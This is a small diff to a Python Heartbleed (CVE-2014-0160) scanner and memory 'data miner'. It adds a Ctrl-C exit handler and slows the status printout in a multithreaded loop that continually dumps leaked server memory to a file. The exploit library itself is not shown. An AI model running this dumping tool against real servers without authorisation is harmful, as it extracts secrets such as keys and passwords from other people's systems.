@@ -4,7 +4,7 @@ OpenSSL Heartbleed (CVE-2014-0160) vulnerability scanner and data miner.
 Author: Einar Otto Stangvik / @einaros / https://hacking.ventures
 Environment: Python 3
 """
-import sys, time, datetime
+import sys, time, datetime, signal
 from optparse import OptionParser
 from multiprocessing.dummy import Pool
 from hblib import Bleeder, hexdump
@@ -46,13 +46,14 @@ def main():
       verbose=opts.verbose,
       smtp_hostname=opts.smtphost)
   if opts.dump:
+    signal.signal(signal.SIGINT, lambda s,f: sys.exit())
     pool = Pool(opts.threads)
     for i in range(opts.threads):
       pool.apply_async(make_worker(bleeder, opts.output), [i])
     while True:
       if not opts.quiet:
         print('[%s] Incoming data rate: %d kbps'%(datetime.datetime.now().strftime('%Y/%m/%d %H:%M:%S'), bleeder.get_bps()/1024.0))
-      time.sleep(2)
+      time.sleep(10)
     return 0
   else:
     vulnerable, data = bleeder.bleed()
